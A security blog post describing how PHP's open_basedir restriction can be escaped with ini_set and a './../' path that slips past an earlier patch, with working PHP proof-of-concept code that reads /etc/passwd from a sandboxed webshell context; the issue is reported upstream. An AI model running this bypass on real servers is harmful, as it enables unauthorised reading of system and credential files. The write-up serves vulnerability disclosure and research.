title:  PHP open_basedir bypass

PHP is a really powerful language, and as a wise man once said, with great power comes great responsibilities. There is nothing more frustrating than obtaining a remote command execution and be restricted by `open_basedir` and `disable_functions`, preventing us from reading `etc/passwd` or turning it into a remote shell. Let's focus here on the former.

The directive `open_basedir` can be set in the `php.ini` file, and prevents PHP from reading file beyond a defined scope. For instance, if it is set to `/var/www/html/myapp`, trying to execute `file_get_contents("/etc/passwd")` should miserably fail. One could consider it as a security measure, but this is not everyone's opinion. Let's suppose now that an attacker managed to upload their webshell on a server where `open_basedir` is enforced, and exec-like function disabled. How to read `/etc/passwd`, then ? 

It is quite well known that having the ability to call `ini_set` at runtime could lead to an `open_basedir` bypass. The latter is defined in a `ini` file by can be **tighten** at runtime, meaning that we can programmatically add more directories to the directive as long as they are sub-directories from the first one. For instance, if `chevre` is a child of `/var/www/html`, one can add it in the directive:

```
open_basedir=/var/www/html/myapp:chevre/
```

but trying to add `/etc` is forbidden.

To do so, the attacker first needs to create a sub-directory and to move into it (let's assume we are in `/var/www/html/myapp`, and the latter is writeable. Let's also assume that `open_basedir` is set to `/var/www/html/myapp`, preventing it us from reading/writing in upper directories):

```php
<?php
    mkdir("dindon");
    chdir("dindon");
```

Now, once the execution context has moved to the directory `/var/www/html/myapp/dindon`, we can refer to the parent directory by appending `../`. Indeed, since this `../` would refer to `/var/www/myapp`, the path would still belong to the already restricted path, and thus be allowed, leading to the following directive:

```
open_basedir=/var/www/html/myapp:../
```

Once done, we can simply move upper, and reach the Holy Grail:

```php
<?php
    mkdir("dindon");
    chdir("dindon");
    ini_set("open_basedir", ini_get("open_basedir").":../");
    chdir(".."); //now we are in /var/www/html/myapp
    chdir(".."); //now in /var/www/html
    chdir(".."); //almost there, we are in /var/www
    chdir(".."); //one step more, we are in /var
    chdir(".."); //yay, we landed in /
```

The issue was reported [https://bugs.php.net/bug.php?id=76359](https://bugs.php.net/bug.php?id=76359), and as someone wrote:

Hmmm, still, the issue was patched, but still disputed, considered as a misused directive instead of a real bug ([https://github.com/php/php-src/pull/7024](https://github.com/php/php-src/pull/7024)).

I was peacefully working on a PHP tool to bypass `disable_functions` directive, with the desire to first bypass `open_basedir`. It was PHP 7.3.29 and the bypass was working like a charm. But when it came to run it on the VM, with PHP 8.1, it failed. I was indeed not able to append `../` to the directive. Quite frustrated, I took a look at the issue, and then at [its patch](https://github.com/php/php-src/pull/7024/commits/20451f09130ef4b1f6cbb4abbe07ca884bb1dca0):

One can see here that the code checks whether the 1st and 2nd character are dots, and that the 3rd one is either a null or a slash. But what if the 2nd character is a slash, with a path being something like `'./..'` ?

Indeed, I changed my payload to something like:

```php
<?php
    mkdir("dindon");
    chdir("dindon");
    ini_set("open_basedir", ini_get("open_basedir").":./../"); //here, prepend with ./
    chdir(".."); //now we are in /var/www/html/myapp
    chdir(".."); //now in /var/www/html
    chdir(".."); //almost there, we are in /var/www
    chdir(".."); //one step more, we are in /var
    chdir(".."); //yay, we landed in /
```

and landed into `/` :smiley:

I then wrote a small PoC and tried it on a Docker running PHP 8.2.2RC1.:

```php
<?php
  function read_etc_passwd(){
    $content = @file_get_contents("/etc/passwd");
    if ($content !== false){echo $content;}
    else {echo "Nope, /etc/passwd not readable".PHP_EOL;}
  }
  echo "Running PHP version ".PHP_VERSION.PHP_EOL;
  read_etc_passwd();
  $path = "a/b/c";
  $here = getcwd();
  if (mkdir($path, 0777, true)){
    chdir($path);
    ini_set("open_basedir", ini_get('open_basedir').":../../../");
    chdir($here);
    echo "open_basedir directive is still ".ini_get('open_basedir').PHP_EOL;
    read_etc_passwd();
  }

  $path = "d/e/f";
  if (mkdir($path, 0777, true)){
    chdir($path);
    ini_set("open_basedir", ini_get('open_basedir').":./../../../");
    chdir($here);
    echo "open_basedir directive is now ".ini_get('open_basedir').PHP_EOL;
    read_etc_passwd();
  }
?>
```

And the result was as follows:

The issue was reported [here](https://github.com/php/php-src/issues/10469) and I guess that it will not be considered as a security issue. But still, does it really make sense to allow dot-dot-slash in such path ??
